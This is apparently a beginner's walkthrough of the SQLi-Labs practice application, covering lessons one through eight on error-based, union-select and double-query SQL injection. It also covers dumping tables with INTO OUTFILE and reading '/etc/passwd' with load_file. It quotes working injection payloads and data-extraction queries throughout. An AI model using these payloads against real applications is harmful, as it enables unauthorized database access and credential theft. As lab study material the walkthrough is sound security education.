# SQLI-LABS

# Introduction:


**SQLI labs to test error based, Blind boolean based, Time based.**

**Structured Query Language**, also known as **SQL**, is basically a programming language that deals with databases.
For beginners, databases are simply data stores that contain both **client side** and **server side** data. **SQL** manages databases through structured queries, relations, object oriented programming, etc.

Programming geeks will have come across many such types of software, like **MySQL, MS SQL, Oracle, and Postgresql**.
These are a few of the programs that give us the capability to manage large databases/data stores through **structured queries**.

The lab we will be using for demonstration is SQLi Labs, which can be freely downloaded from https://github.com/Sushant15/sqli-labs solely for the purpose of studying and making applications safe from such vulnerabilities.

**SQLI-LABS is my attempt to explain the basics involved in SQL injections.**

**SQLI-LABS is a platform to learn SQLI Following labs are covered for GET and POST scenarios:**

1. Error Based Injections (Union Select)
  
      i. String\
      ii. Integer
  
2. Error Based Injections (Double Injection Based)

3. BLIND Injections: 

   i. Boolian Based 
   
   ii. Time Based

4. Update Query Injection 

5. Insert Query Injections 

6. Header Injections. 

    i. Referer based
    
    ii. UserAgent based
    
    iii. Cookie based
    

7. Second Order Injections

8. Bypassing WAF

      i. Bypassing Blacklist filters Stripping comments Stripping OR & AND Stripping SPACES and COMMENTS Stripping UNION &              SELECT
  
      ii. Impidence mismatch
  

9. Bypass addslashes()

10. Bypassing mysql_real_escape_string. (under special conditions)

11. Stacked SQL injections.

12. Secondary channel extraction




  **Lets GO to Explore**😄😄
  
  **Labs:**

  **Lesson 1: GET – Error-Based – Single Quotes – String**

You get a **“Welcome Dhakkan”** (a Hindi slang word that usually refers to a stupid person). The programmer for SQLI Labs definitely has a good sense of humor. Now we get a parameter “id” with numeric value injection.
We have the login name Dumb and the password is Dump. So basically we added a parameter to the URL and pointed that parameter to the first record. There was an immediate query from the browser to the database table to fetch the record for id=1. Similarly, you can fire the query for subsequent records like 2, 3, 4….
Here is the actual query which ran at the back end:

Main Query is working from back is this..
**Select * from TABLE where id=1;**

If Someone can think out of the box and give input as some other character.... Then what should we do..


In this we have to understand the query as it has quotes between 1 but by seeing it carefully it is the double qoutes in between the numbers.

**    ‘             1’      - -   ,   # ,   /*         */ ‘  LIMIT 0,1**


  %20      for.    spaces\
  %23      for.     # 

After putting - - symbol as we are working with the URL we have to encode it in the URL base.
OR it should be URL encoded….\

When we uses - - to comment out rest of the query then we need to provide extra space after the double  - - , if not it will not work….\
As this is the injection through URL  so we have to URL encode the # sign…
And URL encode for. # symbol is %23….\
The developer has already enclosed two quotes around what ever we input…






  **Lesson 2: GET – Error-Based – Integer-Based**
  
Now we try to attack the application similarly by putting in strings such as “abc“and “abcd.” We observe that for lesson 2 we receive an error from the database. Next we do a bit of tampering with the number and add a ‘ (single quote) with the number.
We again get an error in the Mysql server for incorrect syntax.
**You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘\’ LIMIT 0,1′ at line 1**

Now the query which it changes to is

**Select * from TABLE where id = 1’ ;**

So we have an odd number of single quotes (‘), which breaks the query and also string input throwing error.
Hence the result we come out with is that the coder has used integer for the query.

**Select * from TABLE where id = (some integer value);**
To add protection from such errors we can comment out the rest of the query:

**To be Noted** 😂\
You Have to Add a space after the comments or URL encoded space (%20) or else the comment will not work.



**Lesson 3: Error-based single quotes with twist – string**

In this lesson we will learn to perform an error-based single quote attack. First we try to attack the application similarly by putting some strings and number to check how the query is working using the message which is displayed on the screen in lesson 3 .
**For example ?id='**
After injecting the code we got an error message like...
Server version for the right syntax to use near ””) LIMIT 0,1′ at line 1

Here it means that the developer has used the query which is..
**Select login_name, select password from table where id= (‘our input here’)**

**So again we inject the code with this ?id=1′) –+**
We are able to get through with the username and password and the query has been commented out.




**Lesson 4: Error-Based Double Quotes String**

In this lesson we will learn to perform an error-based double quotes string. First we try to attack the application similarly by putting some strings and number to check how the query is working using the message which is displayed on the screen in lesson 4.

**For example ?id="**
After injecting the code we got an error message like.....
Server version for the right syntax to user near  '"1"") LIMIT 0,1' at line 1

Here it means that the developer has used the query which is...
**Select login_name, password from table where id= ("our input here ")**

So here we have to deal with the double quotes 

**So again we inject the code with this ?id=1") --+**
We are able to get through with the username and password and the query has been commented out.




**Lesson 5(Not less-5) : Fixing the query without using comments**

In this lesson we will learn to perform an error-based double quotes injection attack as **?id=1′ AND ‘2 OR ?id=3′ AND ‘4**

After injecting this type of code, the database always shows different usernames and passwords. Now we use the union select command to get more sensitive information from the database.\
**-6′ union select 5, version(),3 AND ‘1**

In this query we use the version() function for detecting the database version; similarly, we can use another different query for retrieving more information from database.\
**-6′ union select 5,current_user,3 AND ‘1**



**Lesson 6 : Double Query Injection**

In this lesson we will learn to perform an Error-based Double Query Injection Attack as **?id=1 \ or id=1'** whether we see What the developer has put in if the query is breaking we put **1'** .

We can see that the query is being follwed at the back is **Select col1,col2,col3 from table where id='3   '  OR '1   '**


These are the some Query which I have used in msql:

**select count(*) from information_schema.tables;**

**select rand() ;**

**select table_name, table_schema from information_schema.tables group by table_schema**

**select database();**

**select concat((select database()));**

**select concat(0x3a,0x3a(select database()),0x3a,0x3a);**

**select concat(0x3a,0x3a(select database()),0x3a,0x3a) a;**

**select concat(0x3a,0x3a(select database()),0x3a,0x3a, floor (rand()*2)) a;**

**concat(0x3a,0x3a(select database()),0x3a,0x3a, floor (rand()*2)) a from information_schema.columns;**

**select concat(0x3a,0x3a(select database()),0x3a,0x3a, floor (rand()*2)) a from information_schema.tables;**

**select count(*), concat(0x3a,0x3a(select database()),0x3a,0x3a, floor (rand()*2)) a from information_schema.tables group by a;**

**select count(*), concat(0x3a,0x3a(select version()),0x3a,0x3a, floor (rand()*2)) a from information_schema.columns group by a;**


**select count(*), concat(0x3a,0x3a(select user()),0x3a,0x3a, floor (rand()*2)) a from information_schema.columns group by a;**



**Lesson 7: Dumping database using out file**

In this lesson, we will learn how to dump the database by using outfile. Let us start by breaking the sql query like this: **?id=1′–+**

Now I would like to discuss some functions at the back end. Start mysql at your terminal and use the database security:
**use security;**
Let us dump the database with basic commands: **select * from users;**
Now dump the database and ask mysql to write it into a file by using a function called outfile, so the query is
**select * from users into outfile “/tmp/tests.txt”;**


So we can see there is another function, which is known as dump file. Dump file uses only a single row so we have to give it a limit for dumping the database:

**select * from users limit 0,1 into dumofile "/tmp/text2.txt"**

Another function which is used is load file. It is used for loading files from the file system into mysql. Here is the query:

**select load_file("etc/passwd")**






**Lesson 8: Blind Boolean-based single quotes**

In this lesson we will learn to perform blind injections. Let us start from enumeration and try to break the query:

**?id=1′ ?id=1\)**

After injecting some queries we see that we do not have an error message on the screen. Hence we are not sure here that the injection exists on this page or not. That is why this type of injection is called blind injection. 

There are two types of blind injection, **Boolean-based and time-based injections.**










